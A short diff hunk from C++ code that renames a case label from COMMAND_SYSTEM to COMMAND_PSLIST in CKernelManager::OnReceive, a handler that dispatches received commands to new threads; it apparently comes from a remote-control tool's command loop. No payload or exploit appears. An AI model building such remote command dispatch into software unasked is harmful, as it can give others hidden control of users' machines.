@@ -94,7 +94,7 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 			);
 			break;
 
-		case COMMAND_SYSTEM:
+		case COMMAND_PSLIST:
 			m_hThread[m_nThreadCount++] = DoCreateThread
 			(
 				NULL,
